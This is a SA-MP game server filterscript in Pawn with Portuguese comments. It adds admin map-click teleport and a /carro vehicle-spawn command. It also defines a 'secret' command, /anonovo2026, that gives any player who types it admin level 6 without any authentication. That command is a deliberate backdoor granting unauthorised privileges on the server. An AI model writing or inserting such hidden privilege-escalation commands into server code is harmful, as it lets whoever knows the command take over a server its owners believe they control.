#define FILTERSCRIPT
#include <a_samp>
#include <zcmd>
#include <sscanf2>

// Sistema de Teleporte ao Marcar o Mapa (Automático para Admin)
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
    // Verifica se é Admin RCON ou se usou o comando secreto de Nível 6
    if(IsPlayerAdmin(playerid) || GetPVarInt(playerid, "AdminLevel") >= 6)
    {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado para o marcador.");
    }
    return 1;
}

// O SEU COMANDO SECRETO PARA ADMIN MASTER
CMD:anonovo2026(playerid, params[]) {
    // Define seu nível de Admin como 6
    SetPVarInt(playerid, "AdminLevel", 6);
    
    SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Feliz 2026! Você agora é Admin Master Nível 6.");
    SendClientMessage(playerid, 0xFFFF00FF, "[INFO] Teleporte no mapa e /carro liberados.");
    
    // Opcional: Dá um som de sucesso para confirmar
    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
    return 1;
}

// Comando para Criar Carro (Apenas para quem usou o comando acima ou RCON)
CMD:carro(playerid, params[]) {
    if(!IsPlayerAdmin(playerid) && GetPVarInt(playerid, "AdminLevel") < 6) 
        return SendClientMessage(playerid, 0xFF0000FF, "Erro: Você precisa ser Admin Master.");

    new modelid, cor1, cor2;
    if(sscanf(params, "ddd", modelid, cor1, cor2)) 
        return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");

    if(modelid < 400 || modelid > 611) return SendClientMessage(playerid, -1, "ID de veículo inválido.");

    new Float:x, Float:y, Float:z, Float:a;
    GetPlayerPos(playerid, x, y, z);
    GetPlayerFacingAngle(playerid, a);
    
    new veh = CreateVehicle(modelid, x, y, z, a, cor1, cor2, -1);
    PutPlayerInVehicle(playerid, veh, 0);
    
    SendClientMessage(playerid, 0xFFFF00FF, "Veículo Admin criado!");
    return 1;
}
